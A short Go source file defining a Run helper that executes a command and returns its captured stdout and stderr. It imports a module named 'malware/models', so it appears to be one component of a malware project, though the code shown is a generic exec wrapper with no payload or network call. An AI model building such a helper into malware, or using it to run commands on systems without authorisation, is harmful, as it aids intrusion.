package platforms

import (
	"bytes"
	"malware/models"
	"os/exec"
)

func Run(name string, arg ...string) *models.Command {
	var stdoutBuff bytes.Buffer
	var stderrrBuff bytes.Buffer

	cmd := exec.Command(name, arg...)
	cmd.Stdout = &stdoutBuff
	cmd.Stderr = &stderrrBuff
	cmd.Run()
	resCmd := &models.Command{
		Data: stdoutBuff.Bytes(),
		Err:  stderrrBuff.Bytes(),
	}
	return resCmd
}
